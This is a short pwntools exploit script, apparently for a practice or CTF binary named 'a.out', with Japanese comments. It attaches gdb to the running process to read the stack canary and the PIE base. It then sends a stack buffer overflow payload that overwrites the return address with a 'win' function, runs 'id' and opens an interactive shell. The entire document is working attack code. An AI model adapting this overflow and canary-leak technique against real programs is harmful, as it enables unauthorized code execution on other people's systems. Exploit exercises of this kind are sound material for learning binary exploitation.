import pwn
import time
import os
import re

pwn.context.arch = 'amd64'
pwn.context.log_level = 'info'

# a.out: PIE + canary, win = _Z3winv @ 0x11e9
# buf @ rbp-0x30, canary @ rbp-0x8 => offset 40
# canary is at fs:0x28 => *(fs_base + 0x28)
WIN_OFF = 0x11e9
GDB_OUT = '/tmp/gdb_aout_leak.txt'

if os.path.exists(GDB_OUT):
    os.remove(GDB_OUT)

io = pwn.process('./a.out')
io.recvuntil(b'value: ')
pid = io.pid

# gdb.attach でアタッチし、gdbscript で canary と base をファイルにダンプ
# (attach 後プロセスは read で止まるので fs_base が読める)
gdbscript = f'''
set pagination off
set debuginfod enabled off
set logging file {GDB_OUT}
set logging overwrite on
set logging enabled on
printf "CANARY=0x%lx\\n", *(unsigned long*)($fs_base + 0x28)
info proc mappings
set logging enabled off
detach
quit
'''
pwn.gdb.attach(io, gdbscript=gdbscript)

# ログファイルを待つ
canary = None
base = None
for _ in range(50):
    if os.path.exists(GDB_OUT) and os.path.getsize(GDB_OUT) > 0:
        text = open(GDB_OUT).read()
        m = re.search(r'CANARY=(0x[0-9a-f]+)', text)
        if m:
            canary = int(m.group(1), 16)
        for line in text.splitlines():
            if 'a.out' in line:
                base = int(line.split()[0].split('-')[0], 16)
                break
        if canary and base:
            break
    time.sleep(0.1)

assert canary, f'failed to leak canary:\n{open(GDB_OUT).read() if os.path.exists(GDB_OUT) else "(no file)"}'
assert base, f'failed to leak PIE base:\n{open(GDB_OUT).read() if os.path.exists(GDB_OUT) else "(no file)"}'

win = base + WIN_OFF
pwn.log.info(f'canary={hex(canary)} base={hex(base)} win={hex(win)}')

payload  = b'A' * 40
payload += pwn.p64(canary)
payload += b'B' * 8
payload += pwn.p64(win)

# detach 後プロセスは read 待ちに戻っている
io.send(payload)
time.sleep(0.2)
io.sendline(b'echo PWNED_GDB_ATTACH; id')
print(io.recvrepeat(timeout=2))
io.interactive()
